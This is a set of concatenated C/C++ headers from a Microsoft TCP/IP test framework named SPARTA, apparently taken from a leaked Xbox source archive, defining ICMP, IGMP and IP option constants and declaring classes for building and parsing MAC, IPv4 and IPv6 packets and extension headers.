// type field of the IPoptions in the IP Packet
#define IP_OPTIONS_END_OF_OPTIONLIST                    0
#define IP_OPTIONS_NO_OPERATION                                 1
#define IP_OPTIONS_RECORD_ROUTE                                 7
#define IP_OPTIONS_TIME_STAMP                                   68
#define IP_OPTIONS_BASIC_SECURITY                               130
#define IP_OPTIONS_LOOSE_SOURCE_RECORD_ROUTE    131
#define IP_OPTIONS_EXTENDED_SECURITY                    133
#define IP_OPTIONS_STREAM_IDENTIFIER                    136
#define IP_OPTIONS_STRICT_SOURCE_RECORD_ROUTE   137
#define IP_OPTIONS_UNKNOWN_TYPE                                 255


#define IPOPT_TS_TSONLY         0
#define IPOPT_TS_TSANDADDR      1
#define IPOPT_TS_PRESPEC        3

#define IP_OPTIONS_MINIMUM_LENGTH       1
#define IP_OPTIONS_MAXIMUM_LENGTH       40

#define IP_OPTIONS_MINIMUM_OFFSET       4

#define IPOPT_OPTVAL    0
#define IPOPT_OPTLEN    1
#define IPOPT_OPTOFFSET 2
#define IPOPT_OPT_FLAG_OFFSET   3

typedef unsigned long IPAddr;     // An IP address.

typedef unsigned char UCHAR;
typedef unsigned short USHORT;

#define MAX_SIZE_IP_STRING      16  // Null terminated
#define MAX_SIZE_IPV6_STRING    40

#define BROADCAST_ADDRESS "255.255.255.255"



///////////////////////////////////////////////////////////////
// ICMPv4 constants:      types & codes
///////////////////////////////////////////////////////////////

#define  ICMPv4_ECHO_REPLY_TYPE           0        // echo reply

#define  ICMPv4_DEST_UNR_TYPE             3        // destination unreachable:
// codes for DEST_UNR
#define  ICMPv4_NET_UNR_CODE              0        // net unreachable
#define  ICMPv4_HOST_UNR_CODE             1        // host unreachable
#define  ICMPv4_PROT_UNR_CODE             2        // protocol unreachable
#define  ICMPv4_PORT_UNR_CODE             3        // port unreachable
#define  ICMPv4_FRAG_DF_CODE              4        // fragmentation needed + DF
#define  ICMPv4_SR_FAIL_CODE              5        // source route failed
#define  ICMPv4_DST_NET_UNKNOWN_CODE      6        // dest network unknown
#define  ICMPv4_DST_HOST_UNKNOWN_CODE     7        // dest host unknown
#define  ICMPv4_SRC_HOST_ISOLATED_CODE    8        // source host isolated
#define  ICMPv4_NET_PROHIBITED_CODE       9        // communication with dest network administratively prohibited
#define  ICMPv4_HOST_PROHIBITED_CODE     10        // communication with dest host administratively prohibited
#define  ICMPv4_NET_UNR_FOR_TOS_CODE     11        // network unreachable for type of service
#define  ICMPv4_HOST_UNR_FOR_TOS_CODE    12        // host unreachable for type of service
// The following three codes not used by Microsoft
#define  ICMPv4_COMM_PROHIBITED_FILTER_CODE  13    // Communication prohibited filtering
#define  ICMPv4_HOST_PRECEDENCE_VOILATION_CODE 14  // host precedence voilation
#define  ICMPv4_PRECEDENCE_CUTOFF_CODE   15        // Precedence cutoff in effect


#define  ICMPv4_SRC_QUENCH_TYPE           4        // source quench

#define  ICMPv4_REDIRECT_TYPE             5        // redirect message
// codes for redirect
#define  ICMPv4_NET_RE_CODE               0        // redirect for network
#define  ICMPv4_HOST_RE_CODE              1        // redirect for host
#define  ICMPv4_TOSN_RE_CODE              2        // redirect for TOS/network
#define  ICMPv4_TOSH_RE_CODE              3        // redirect for TOS/host

#define  ICMPv4_ECHO_REQUEST_TYPE         8        // echo request
#define  ICMPv4_ROUTER_ADVERTISEMENT_TYPE 9        // router advertisement
#define  ICMPv4_ROUTER_SOLICITATION_TYPE 10        // router solicitation


#define  ICMPv4_TIME_EXCEEDED_TYPE       11        // time exceeded
// codes for time exceeded
#define  ICMPv4_TTL_X_CODE                0        // time-to-live exceeded
#define  ICMPv4_FRAG_X_CODE               1        // frag reassem time excluded

#define  ICMPv4_PARAMETER_TYPE           12        // parameter problem
#define  ICMPv4_PARAM_POINTER_CODE        0        // pointer indicates error
#define  ICMPv4_PARAM_OPTION_CODE         1        // required option missing

#define  ICMPv4_TIME_STAMP_TYPE          13        // timestamp request
#define  ICMPv4_STAMP_REPLY_TYPE         14        // timestamp reply

#define  ICMPv4_INFO_REQ_TYPE            15        // information request
#define  ICMPv4_INFO_REPLY_TYPE          16        // information reply

#define  ICMPv4_MASK_REQ_TYPE            17        // address mask request
#define  ICMPv4_MASK_REPLY_TYPE          18        // address mask reply

#define  ICMPv4_ILLEGAL_TYPE            100        // an arbitrary illegal value


// ICMP header length estimates

#define  ICMPv4_MINLEN         8
#define  ICMPv4_TSLEN         20
#define  ICMPv4_MASKLEN       12
#define  ICMPv4_ADVLENMIN     36

//  ICMPv6 constants are defined in tcpip\tpipv6\inc\icmp6.h

#define PROTOCOL_ICMP6        58


///////////////////////////////////////////////////////////
// IGMP constants
///////////////////////////////////////////////////////////


//
#define IGMPV1_MEMBERSHIP_QUERY_TYPE 0x1
#define IGMPV1_MEMBERSHIP_REPORT_TYPE 0x2
#define IGMP_DVMRP_TYPE 0x3

#define IGMPV2_MEMBERSHIP_QUERY_TYPE 0x11
#define IGMPV2_MEMBERSHIP_REPORT_TYPE 0x16
#define IGMP_LEAVE_GROUP_TYPE 0x17


#endif //__SPARTA_IPCONSTANTS_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\ippacket.hpp ===
/****************************************************************************************
*                                    SPARTA project                                     *
*                                                                                       *
* (TCP/IP test team)                                                                    *
*                                                                                       *
* Filename: IPPacket.hpp                                                                *
* Description: this defines the Packet class for IP Packets, extends the MAC Packet     *
*               class                                                                   *
*                                                                                       *
* Revision history:     name          date         modifications                        *
*                                                                                       *
*                       deepakp      2/22/2000    created                               *
*                       jbekmann      5/31/2000    made destructor virtual              *
*                                                                                       *
*                                                                                       *
*                (C) Copyright Microsoft Corporation 1999-2000                          *
*****************************************************************************************/

#ifndef __SPARTA_IP_PACKET_H__
#define __SPARTA_IP_PACKET_H__

#include "sparta.h"
#include "MacPacket.hpp"
#include "IPHeader.hpp"
#include "IPOptions.hpp"
#include "Packet.hpp"

#define IP_MAXIMUM_PACKET_LENGTH  65535    // 
#define IP_MINIMUM_PACKET_LENGTH  66    // with padding

class CIPPacket : public CMacPacket
{

public:
   BOOL      m_IsVersion6;
   CIPHeader &IPHeader;


   CIPPacket(MAC_MEDIA_TYPE MediaType, BOOL fIsVersion6 = FALSE);
   CIPPacket(PKT_PACKET Packet, CMacHeader &MacHeaderParam, CIPHeader &IPHeader, BOOL fIsVersion6 = FALSE);
   virtual ~CIPPacket();

   virtual int GetPacketType();

   virtual DWORD GetMinimumPacketLength(); // override for subsequent packet types
                                            // primarily used for CIPPacket layer

   virtual DWORD GetMaximumPacketLength(); // override for subsequent packet types
        

   SPARTA_STATUS PreparePacketForSend();
   SPARTA_STATUS GetIPData(PVOID pIPData, DWORD * dwDataSize);

   virtual void PrintPacket();
};

#endif // __SPARTA_IP_PACKET_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\macheader.hpp ===
/****************************************************************************************
*                                    SPARTA project                                     *
*                                                                                       *
* (TCP/IP test team)                                                                    *
*                                                                                       *
* Filename: MacHeader.hpp                                                               *
* Description: This is the implementation of the MediaHeader functions                  *
*                                                                                       *
*                                                                                       *
* Revision history:     name          date         modifications                        *
*                                                                                       *
*                       jbekmann      2/17/2000    created                              *
*                                                                                       *
*                                                                                       *
*                (C) Copyright Microsoft Corporation 1999-2000                          *
*****************************************************************************************/

#ifndef __SPARTA_MACHEADER_H__
#define __SPARTA_MACHEADER_H__


#include "packets.h"
#include "media.h"
#include "MacAddress.hpp"
#include "Parser.hpp"

class CPattern;


class CMacHeader
{

    friend class CMacPacket;
    friend class CArpPacket;

protected:

    PKT_BUFFER m_MacHeader; // we want access to these members from the MacPacket class

public:

    PVOID GetRawBuffer();
    DWORD GetRawBufferLength();
    DWORD GetMinimumMediaPacketLength();
    DWORD GetMaximumMediaPacketLength();
    

    CMacHeader(MAC_MEDIA_TYPE MediaType);

// create a MEDIA header buffer from raw data, part of the parsing API
// dwBytesRead will return the number of bytes used for the header
    CMacHeader(MAC_MEDIA_TYPE MediaType, PVOID pvRawData, DWORD dwBytesRemaining, OUT PDWORD pdwBytesRead);
    
    ~CMacHeader();

    SPARTA_STATUS SetDestAddress(CMacAddress &Address);

    SPARTA_STATUS SetSrcAddress(CMacAddress &Address);

    SPARTA_STATUS GetSrcAddress(CMacAddress &Address);
    // takes a previously created Address object and fills it with the address

    SPARTA_STATUS GetDestAddress(CMacAddress &Address);
    // takes a previously created Address object and fills it with the address

    SPARTA_STATUS SetProtocolType(WORD wProtocolType);

    WORD GetProtocolType();

    SPARTA_STATUS Print();

    static CPattern *CreateDestAddressPattern(MAC_MEDIA_TYPE MediaType, CMacAddress *Address);
    static CPattern *CreateSrcAddressPattern(MAC_MEDIA_TYPE MediaType, CMacAddress *Address);

    static CPattern *CreateDestAddressPattern(MAC_MEDIA_TYPE MediaType, CMacAddress &Address)
    {
        return CreateDestAddressPattern(MediaType,&Address);
    }

    static CPattern *CreateSrcAddressPattern(MAC_MEDIA_TYPE MediaType, CMacAddress &Address)
    {
        return CreateSrcAddressPattern(MediaType,&Address);
    }

    static CPattern *CreateProtocolTypePattern(MAC_MEDIA_TYPE MediaType, USHORT usProtocolType);

    static WORD LookupMediaHeaderLength(MAC_MEDIA_TYPE MediaType);
};

#endif // __SPARTA_MACHEADER_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\macaddress.hpp ===
/****************************************************************************************
*                                    SPARTA project                                     *
*                                                                                       *
* (TCP/IP test team)                                                                    *
*                                                                                       *
* Filename: MacAddress.hpp                                                              *
* Description: This is the implementation of the MacAddress functions                   *
*                                                                                       *
*                                                                                       *
* Revision history:     name          date         modifications                        *
*                                                                                       *
*                       jbekmann      2/17/2000    created                              *
*                                                                                       *
*                                                                                       *
*                (C) Copyright Microsoft Corporation 1999-2000                          *
*****************************************************************************************/

#ifndef __SPARTA_MACADDRESS_H__
#define __SPARTA_MACADDRESS_H__


#include "packets.h"
#include "media.h"

class CMacAddress
{
protected:
    WORD m_wAddressLength;
	BYTE *m_bpAddress;
    MAC_MEDIA_TYPE m_MediaType;
    TCHAR *m_szStringVersion;

public:
    CMacAddress(MAC_ADDRESS MacAddress); // constuctor taking a C-style struct equivalent
    CMacAddress(MAC_MEDIA_TYPE MediaType); // constructor
    CMacAddress(MAC_MEDIA_TYPE MediaType,const TCHAR *szAddressString); // constructor

    ~CMacAddress(); // destructor

    SPARTA_STATUS SetAddress(const TCHAR *szAddress);
    SPARTA_STATUS SetAddress(const PBYTE pbNewAddress, DWORD dwNewAddressLength);
    BYTE *GetBuffer() const;
    WORD GetLength() const;
    MAC_MEDIA_TYPE GetMediaType() const;
    TCHAR *GetString() const; // returns string format of Media Address

    VOID Print();

    bool operator==(const CMacAddress &other) const
    {
        if(m_MediaType == other.m_MediaType &&
           m_wAddressLength == other.m_wAddressLength)
        {
            if(memcmp(m_bpAddress,other.m_bpAddress,m_wAddressLength) == 0)
                return true;
        }
    
        return false;
    }

};

WORD GetMediaAddressLength(MAC_MEDIA_TYPE MediaType); // also needed by MacHeader

#endif
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\ipv6packet.hpp ===
/****************************************************************************************
*                                    SPARTA project                                     *
*                                                                                       *
* (TCP/IP test team)                                                                    *
*                                                                                       *
* Filename: Ip6Packet.hpp                                                               *
* Description: this defines the Packet class for IPv6 Packets, extends the Media Packet *
*                                                                                       *
*                                                                                       *
* Revision history:     name          date         modifications                        *
*                                                                                       *
*                       jbekmann     8/24/2000    created                               *
*                                                                                       *
*                                                                                       *
*                (C) Copyright Microsoft Corporation 1999-2000                          *
*****************************************************************************************/

#ifndef __SPARTA_IP6_PACKET_H__
#define __SPARTA_IP6_PACKET_H__

#include "sparta.h"
#include "MacPacket.hpp"
#include "Ipv6Header.hpp"
#include "Packet.hpp"

#define IP6_MAXIMUM_PACKET_LENGTH  65535    // 
#define IP6_MINIMUM_PACKET_LENGTH  66	// with padding

class CIPv6Packet : public CMacPacket
{
public:
    CIPv6Header &IPv6Header;

    CIPv6Packet(MAC_MEDIA_TYPE MediaType);
    CIPv6Packet(PKT_PACKET Packet, CMacHeader &MacHeaderParam, CIPv6Header &IPv6Header);
    virtual ~CIPv6Packet();

    virtual int GetPacketType();

    virtual DWORD GetMinimumPacketLength(); // override for subsequent packet types
                                            // primarily used for CIPv6Packet layer

    virtual DWORD GetMaximumPacketLength(); // override for subsequent packet types
	


	SPARTA_STATUS PreparePacketForSend();

//	SPARTA_STATUS GetIPData(PVOID pIPData, DWORD * dwDataSize);

    virtual void PrintPacket();
};

#endif // __SPARTA_IP6_PACKET_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\ipoptionsvector.hpp ===
/****************************************************************************************
*                                    SPARTA project                                     *
*                                                                                       *
* (TCP/IP test team)                                                                    *
*                                                                                       *
* Filename: CIPOptionsVector.hpp                                                               *
* Description: This is the implementation of the IPHeader functions                  *
*                                                                                       *
*                                                                                       *
* Revision history:     name          date         modifications                        *
*                                                                                       *
*                       deepakp      4/25/2000    created                              *
*                                                                                       *
*                                                                                       *
*                (C) Copyright Microsoft Corporation 1999-2000                          *
*****************************************************************************************/


#ifndef __SPARTA_IPOPTIONVECTOR_H__
#define __SPARTA_IPOPTIONVECTOR_H__

#include "IPOptions.hpp"

class CIPOptionsVector
{
	CIPOption *m_optionList[100];
	DWORD m_nextElementIndex;
	DWORD m_endElementIndex;

public:
	CIPOptionsVector();
	CIPOptionsVector(CIPOption** optionArray,DWORD nOptions);
	~CIPOptionsVector();

	// NOT to be provided as a COM API
	void FillWithOptions(CIPOption** optionList,DWORD nOptions);

	bool HasMoreIPOptions();

	CIPOption* NextIPOption();

	CIPOption* IPOptionAt(DWORD index);

	void ResetOptionVector();

	DWORD NumberOfOptions();
};


#endif // __SPARTA_IPOPTIONVECTOR_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\macpacket.hpp ===
/****************************************************************************************
*                                    SPARTA project                                     *
*                                                                                       *
* (TCP/IP test team)                                                                    *
*                                                                                       *
* Filename: MacPacket.hpp                                                               *
* Description: this defines the Packet class for Media Packets, extends the Packet class*
*                                                                                       *
*                                                                                       *
* Revision history:     name          date         modifications                        *
*                                                                                       *
*                       jbekmann      2/22/2000    created                              *
*                       jbekmann      5/31/2000    made destructor virtual              *
*                                                                                       *
*                                                                                       *
*                (C) Copyright Microsoft Corporation 1999-2000                          *
*****************************************************************************************/

#ifndef __SPARTA_MAC_PACKET_H__
#define __SPARTA_MAC_PACKET_H__

#include "sparta.h"
#include "MacHeader.hpp"
#include "Packet.hpp"

class CMacPacket : public CPacket
{
public:
    CMacHeader &MacHeader;

    CMacPacket(MAC_MEDIA_TYPE MediaType);
    CMacPacket(PKT_PACKET Packet, CMacHeader &MacHeader);
    virtual ~CMacPacket();

    virtual int GetPacketType();

    virtual DWORD GetMinimumPacketLength(); // override for subsequent packet types
                                            // primarily used for CMacPacket layer

    virtual DWORD GetMaximumPacketLength(); // override for subsequent packet types

    virtual void PrintPacket();
};

#endif // __SPARTA_MAC_PACKET_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\ipv6header.hpp ===
/****************************************************************************************
*                                    SPARTA project                                     *
*                                                                                       *
* (TCP/IP test team)                                                                    *
*                                                                                       *
* Filename: Ip6Header.hpp                                                                *
* Description: This is the implementation of the Ip6Header functions                     *
*                                                                                       *
*                                                                                       *
* Revision history:     name          date         modifications                        *
*                                                                                       *
*                       deepakp      4/18/2000    created                               *
*                       balasha      5/02/2000    Added AutoChecksum Calculation        *
*                                                                                       *
*                                                                                       *
*                (C) Copyright Microsoft Corporation 1999-2000                          *
*****************************************************************************************/

#ifndef __SPARTA_Ip6Header_H__
#define __SPARTA_Ip6Header_H__


#include "packets.h"
#include "media.h"
#include "Parser.hpp"
#include "Media.h"
#include "Pattern.hpp"

#include "ipinfo.h"
//#include "ip6.h"

#pragma pack(push,origpack)
#pragma pack(1)

//
// IPv6 Header Format.
// See RFC 1883, page 5 (and subsequent draft updates to same).
//

typedef struct IPv6Header {
    u_long VersClassFlow;   // 4 bits Version, 8 Traffic Class, 20 Flow Label.
    u_short PayloadLength;  // Zero indicates Jumbo Payload hop-by-hop option.
    u_char NextHeader;      // Values are superset of IPv4's Protocol field.
    u_char HopLimit;
    struct in6_addr Source;
    struct in6_addr Dest;
} tIPv6Header;

#pragma pack(pop,origpack)


#define IVP6BASEHEADERLENGTH sizeof(tIPv6Header)


class CIPv6Header
{
    friend class CIPv6Packet;

private:

//    VOID ParseBufferIntoVariables();
//    VOID ParseVariablesIntoBuffer();

protected:
   IPv6Header *m_pIPv6Header;

    PKT_BUFFER m_IPv6Header; // we want access to these members from the IPPacket class

public:

    
	CIPv6Header();
	
//	CIPv6Header(PVOID rawBuffer,DWORD actualSize,DWORD maxSize);
    
    CIPv6Header(PVOID pvRawData, DWORD dwBytesRemaining, OUT PDWORD pdwBytesRead);
    
    ~CIPv6Header();

#if 0
	SPARTA_STATUS GetSrcAddr(TCHAR *ipBuff,DWORD * dwlen);

	SPARTA_STATUS GetDestAddr(TCHAR *ipBuff,DWORD * dwlen);

    ULONG GetSrcAddr();
    ULONG GetDestAddr();
   

	/**++
	Routine Description:

	  Returns the Actual IP Datagram length of the IP Packet(including options) buffers
	  This is not the IP Datagram length from the IP Header but the buffer length that is
	  used to store the ip header and the ip options and the IP data (datagram)

	  Returns: DWORD_ERROR_VALUE in case of Error

	--*/
	DWORD GetActualDatagramLength();

	/**++
	Routine Description:
	
	  Returns the Actual Header length of the IP Packet(including options) buffers
	  This is not the header length from the IP Header but the buffer length that is
	  used to store the ip header and the ip options

	  Returns: DWORD_ERROR_VALUE in case of Error

	--*/
	DWORD GetActualHeaderLength();

	

	// Methods for Pattern filtering
	static CPattern *CreateSrcIPv6AddressPattern(MAC_MEDIA_TYPE MediaType,TCHAR *sIpAdd);
	static CPattern *CreateDestIPv6AddressPattern(MAC_MEDIA_TYPE MediaType,TCHAR * dIpAdd);
	
    static CPattern *CreateSrcIPv6AddressPattern(MAC_MEDIA_TYPE MediaType,ULONG sIpAdd);
	static CPattern *CreateDestIPv6AddressPattern(MAC_MEDIA_TYPE MediaType,ULONG dIpAdd);

	
	PKT_BUFFER GetRawBuffer(); // not to be used from the script

	PVOID GetRawBufferData();

	SPARTA_STATUS SetRawBuffer(PKT_BUFFER buffer);


    DWORD GetRawBufferLength();

#endif //0

    void Print();

    SPARTA_STATUS PreparePacketForSend();


};

#endif // __SPARTA_IP6HEADER_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\ipv6extheaders.hpp ===
//////////////////////////////////////////////////////////////////////////
//                       SPARTA project
//
// (TCP/IP test team)
//
// Filename:      Ipv6OptionsHeader.hpp
// Description:   This is the implementation of the option Extention Header
//                type HopByHop and DestinationOptions
//
// Revision history:     name          date         modifications
//                       jbekmann      10/9/2000    created
//
//            (C) Copyright Microsoft Corporation 1999-2000
//////////////////////////////////////////////////////////////////////////

#ifndef __SPARTA_Ip6ExtHeaders_H__
#define __SPARTA_Ip6ExtHeaders_H__


#include "packets.h"
#include "media.h"
#include "Parser.hpp"
#include "Media.h"
#include "Pattern.hpp"
#include "ipinfo.h"
#include "ipheader.hpp"



/////////////////////////////////////////////////
// base header class -- virtual class that everything else is based off
/////////////////////////////////////////////////

//
// functions supported generically by all extension header types
// Deal with type of this header and type of the next header in the chain
//
class CIPv6ExtensionHeader
{
public:
   virtual UCHAR GetHeaderType();         // get type of this header
   virtual VOID  SetNextHeader(UCHAR ucNextHeader); 
   virtual UCHAR GetNextHeader();
   virtual USHORT GetLength();
};


/////////////////////////////////////////////////
// options header class.  Used for hop-by-hop and destination options
/////////////////////////////////////////////////

#define  MIN_OPTIONS_HEADER_SIZE    8
#define  MAX_OPTIONS_HEADER_SIZE    512
#define  MAX_OPTION_SIZE            256

struct OptionData
{
   UCHAR    ucType;                        // option type
   UCHAR    ucDataLength;                  // In bytes, not counting two for the header.
   UCHAR    pbOptionData[MAX_OPTION_SIZE]; // pointer to the option data
};

//
// from ip6.h
//
// typedef struct IPv6OptionsHeader 
// {
//    u_char NextHeader;
//    u_char HeaderExtLength;  // In 8-byte units, not counting first 8.
// } IPv6OptionsHeader;
// This is followed by 1 or more OptionsData structures
//

class CIPv6OptionsHeader : public CIPv6ExtensionHeader
{
private:
   //
   // internal variables
   //
   PKT_BUFFER  m_HeaderBuffer;
   UCHAR       m_OptionType;
   BOOL        m_AutoPadOptions;
   BOOL        m_AutoCalcLength;
   USHORT      m_WriteOffset;
   USHORT      m_ReadOffset;
   PVOID       m_pvBuffer;    // handy reference to actual header data in m_HeaderBuffer

public:
   //
   // support for virtual functions from base type
   //
   UCHAR    GetHeaderType()
   {                                
      return m_OptionType;
   }
   UCHAR    GetNextHeader();
   VOID     SetNextHeader(UCHAR ucNextHeader);
   USHORT   GetLength();

   //
   // class specific functions
   //
   CIPv6OptionsHeader(UCHAR OptionType);        // default constructor.
   CIPv6OptionsHeader(UCHAR OptionType, PVOID pvRawData, DWORD dwBytesRemaining, OUT PDWORD pdwBytesRead); // constructor called by the parser
   ~CIPv6OptionsHeader();       // destructor

   BOOL     GetAutoPad()
   {
      return m_AutoPadOptions;
   }
   VOID  SetAutoPad(BOOL Flag)
   {
      m_AutoPadOptions = Flag;
   }
   BOOL     GetAutoCalcLength()
   {
      return m_AutoCalcLength;
   }
   VOID  SetAutoCalcLength(BOOL Flag)
   {
      m_AutoCalcLength = Flag;
   }

   SPARTA_STATUS  SetLength(USHORT usLength);
   
   SPARTA_STATUS AddOption(OptionData *pOptionData);  // appends an option to end
                                                      // of hop by hop options
   OptionData  *GetFirstOption();                     // returns NULL if there is no more option
   OptionData  *GetNextOption();                      // returns NULL if there is no more option
};

/////////////////////////////////////////////////
// routing header class                                  
/////////////////////////////////////////////////


#define  MIN_ROUTING_HEADER_SIZE    8
#define  MAX_ROUTE_ADDRESSES        32
#define  MAX_ROUTING_HEADER_SIZE    (MAX_ROUTE_ADDRESSES*16) + 8

//
// from ip6.h
//
// typedef struct IPv6RoutingHeader 
// {
//    u_char NextHeader;
//    u_char HeaderExtLength;  // In 8-byte units, not counting first 8.
//    u_char RoutingType;
//    u_char SegmentsLeft;     // Number of nodes still left to be visited.
//    u_int Reserved;
// } IPv6RoutingHeader;
// This is followed by 1 or more Ip6Addr structures


class CIPv6RoutingHeader : public CIPv6ExtensionHeader
{
private:
   //
   // internal variables
   //
   PKT_BUFFER  m_HeaderBuffer;
   BOOL        m_AutoCalcLength;
   USHORT      m_NumAddresses;   
   PVOID       m_pvBuffer;    // handy reference to actual header data in m_HeaderBuffer

public:
   //
   // support for virtual functions from base type
   //
   UCHAR    GetHeaderType()
   {                                
      return IP6_PROTOCOL_ROUTING;
   }
   UCHAR    GetNextHeader();
   VOID     SetNextHeader(UCHAR ucNextHeader);
   USHORT   GetLength();

   //
   // class specific functions
   //
   CIPv6RoutingHeader();        // default constructor.
   CIPv6RoutingHeader(PVOID pvRawData, DWORD dwBytesRemaining, OUT PDWORD pdwBytesRead); // constructor called by the parser
   ~CIPv6RoutingHeader();       // destructor


   BOOL     GetAutoCalcLength()
   {
      return m_AutoCalcLength;
   }
   VOID  SetAutoCalcLength(BOOL Flag)
   {
      m_AutoCalcLength = Flag;
   }

   SPARTA_STATUS  SetLength(USHORT usLength);
   UCHAR          GetRoutingType();
   SPARTA_STATUS  SetRoutingType(UCHAR ucType);
   UCHAR          GetSegmentsLeft();
   SPARTA_STATUS  SetSegmentsLeft(UCHAR ucSegments);
   ULONG          GetReserved();
   SPARTA_STATUS  SetReserved(ULONG Reserved);
   SPARTA_STATUS  GetAddress(ULONG Slot, IPv6Addr *pAddr);
   SPARTA_STATUS  SetAddress(ULONG Slot, IPv6Addr *pAddr);
   USHORT         GetNumAddresses()
   {
      return m_NumAddresses;
   }

};


/////////////////////////////////////////////////
// fragmentation header class
/////////////////////////////////////////////////

//
// from ip6.h
//
// typedef struct FragmentHeader 
// {
//    u_char NextHeader;
//    u_char Reserved;
//    u_short OffsetFlag;  // Offset is upper 13 bits, flag is lowest bit.
//    u_long Id;
//} FragmentHeader;
//


class CIPv6FragmentHeader : public CIPv6ExtensionHeader
{
private:
   //
   // internal variables
   //
   PKT_BUFFER  m_HeaderBuffer;
   PVOID       m_pvBuffer;    // handy reference to actual header data in m_HeaderBuffer

public:
   //
   // support for virtual functions from base type
   //
   UCHAR    GetHeaderType()
   {                                
      return IP6_PROTOCOL_FRAGMENT;
   }
   UCHAR    GetNextHeader();
   VOID     SetNextHeader(UCHAR ucNextHeader);
   USHORT   GetLength();

   //
   // class specific functions
   //
   CIPv6FragmentHeader();        // default constructor.
   CIPv6FragmentHeader(PVOID pvRawData, DWORD dwBytesRemaining, OUT PDWORD pdwBytesRead); // constructor called by the parser
   ~CIPv6FragmentHeader();       // destructor

   UCHAR          GetReserved();
   SPARTA_STATUS  SetReserved(UCHAR cVal);
   USHORT         GetFragmentOffset();
   SPARTA_STATUS  SetFragmentOffset(USHORT sVal);
   UCHAR          GetReservedFlags();
   SPARTA_STATUS  SetReservedFlags(UCHAR cVal);
   BOOL           GetMoreFragmentsFlag();
   SPARTA_STATUS  SetMoreFragmentsFlag(BOOL bVal);
   ULONG          GetId();
   SPARTA_STATUS  SetId(ULONG ulVal);
};

/////////////////////////////////////////////////
// authentication header class
/////////////////////////////////////////////////


#define  MIN_AUTHENT_HEADER_SIZE    16
#define  MAX_AUTHENT_HEADER_SIZE    512
//
// from ip6.h
//
// typedef struct AHHeader 
// {
//    u_char NextHeader;
//    u_char PayloadLen;  // In 4-byte units, not counting first 8 bytes.
//    u_short Reserved;   // Padding.  Must be zero on transmit.
//    u_long SPI;         // Security Parameters Index.
//    u_long Seq;         // Sequence number for anti-replay algorithms.
//} AHHeader;
// This is followed by 0 or more bytes of authentication data


class CIPv6AuthentHeader : public CIPv6ExtensionHeader
{
private:
   //
   // internal variables
   //
   PKT_BUFFER  m_HeaderBuffer;   // we want access to these members from the IPPacket class
   BOOL        m_AutoCalcLength;
   PVOID       m_pvBuffer;    // handy reference to actual header data in m_HeaderBuffer

public:
   //
   // support for virtual functions from base type
   //
   UCHAR    GetHeaderType()
   {                                
      return IP6_PROTOCOL_AH;
   }
   UCHAR    GetNextHeader();
   VOID     SetNextHeader(UCHAR ucNextHeader);
   USHORT   GetLength();

   //
   // class specific functions
   //
   CIPv6AuthentHeader();        // default constructor.
   CIPv6AuthentHeader(PVOID pvRawData, DWORD dwBytesRemaining, OUT PDWORD pdwBytesRead); // constructor called by the parser
   ~CIPv6AuthentHeader();       // destructor



   BOOL     GetAutoCalcLength()
   {
      return m_AutoCalcLength;
   }
   VOID  SetAutoCalcLength(BOOL Flag)
   {
      m_AutoCalcLength = Flag;
   }

   SPARTA_STATUS  SetLength(USHORT sVal);
   USHORT         GetReserved();
   SPARTA_STATUS  SetReserved(USHORT sVal);
   ULONG          GetSPI();
   SPARTA_STATUS  SetSPI(ULONG lVal);
   ULONG          GetSeq();
   SPARTA_STATUS  SetSeq(ULONG lVal);
   SPARTA_STATUS  GetAuthentData(PVOID pvBuffer, DWORD *dwLen);
   SPARTA_STATUS  SetAuthentData(PVOID pvBuffer, DWORD dwLen);

};


/////////////////////////////////////////////////
// ESP header class
/////////////////////////////////////////////////

//
// from ip6.h
//
// typedef struct ESPHeader
// {
//     u_long SPI;  // Security Parameters Index.
//     u_long Seq;  // Sequence number for anti-replay algorithms.
// } ESPHeader;
//
// Followed by variable amount of payload data then padding, then ESPTrailer
//
// typedef struct ESPTrailer
// {
//    u_char PadLength;   // Number of bytes in pad.
//    u_char NextHeader;
// } ESPTrailer;
// Followed by 0 or more bytes of authentication data
//

class CIPv6ESPHeader : public CIPv6ExtensionHeader
{
private:
   //
   // internal variables
   //
   PKT_BUFFER  m_HeaderBuffer;   // we want access to these members from the IPPacket class

public:
   //
   // support for virtual functions from base type
   //
   UCHAR    GetHeaderType()
   {                                
      return IP6_PROTOCOL_ESP;
   }
   UCHAR    GetNextHeader();
   VOID     SetNextHeader(UCHAR ucNextHeader);
   USHORT   GetLength()
   {
      return 0xFFFF;       // not really supported yet
   }

   //
   // class specific functions
   //
   CIPv6ESPHeader();        // default constructor.
   CIPv6ESPHeader(PVOID pvRawData, DWORD dwBytesRemaining, OUT PDWORD pdwBytesRead); // constructor called by the parser
   ~CIPv6ESPHeader();       // destructor
};


#endif // __SPARTA_Ip6ExtHeaders_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\myaddr.h ===
#ifdef __cplusplus
extern "C" {
#endif

u_long
GetMyAddr(
);

#ifdef __cplusplus
}
#endif
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\memory.h ===
/****************************************************************************************
*                                    SPARTA project                                     *
*                                                                                       *
* (TCP/IP test team)                                                                    *
*                                                                                       *
* Filename: memory.h                                                                    *
* Description: tracks memory allocations and leaks                                      *
*                                                                                       *
*                                                                                       *
* Revision history:     name          date         modifications                        *
*                                                                                       *
*                       jbekmann      2/10/2000    created                              *
*                                                                                       *
*                                                                                       *
